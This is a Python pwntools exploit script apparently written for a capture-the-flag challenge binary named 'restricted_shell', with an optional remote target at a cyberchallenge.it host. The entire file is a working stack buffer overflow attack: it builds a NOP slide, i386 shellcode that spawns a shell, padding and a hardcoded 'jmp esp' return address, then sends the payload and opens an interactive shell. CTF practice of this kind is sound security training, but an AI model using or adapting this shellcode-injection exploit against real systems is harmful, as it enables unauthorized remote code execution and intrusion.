#!/usr/bin/env python3
from pwn import *

# Set the architecture and context
context.arch = 'i386'
context.os = 'linux'
context.bits = 32

# Start the target process (local or remote)
# Uncomment the remote line to attack the remote service
p = process('./restricted_shell')
# p = remote('shell.challs.cyberchallenge.it', 9123)

# Define the buffer size (40 bytes for buffer + 4 bytes for saved EBP)
buf_size = 40
saved_ebp_size = 4

# Generate shellcode for spawning a shell
shellcode = asm(shellcraft.i386.linux.sh())

# Calculate the NOP slide size (buffer size - shellcode length)
nop_slide = b'\x90' * (buf_size - len(shellcode))

# Address of `jmp esp` (overwrite return address)
addr = 0x08048593

# Construct the payload
payload = nop_slide + shellcode + b'A' * saved_ebp_size + p32(addr) + shellcode

# Print payload information for debugging
print(f"Payload length: {len(payload)}")
print(f"Payload: {payload}")

# Send the payload to the target process
p.sendline(payload)

# Interact with the process to maintain the shell
p.interactive()
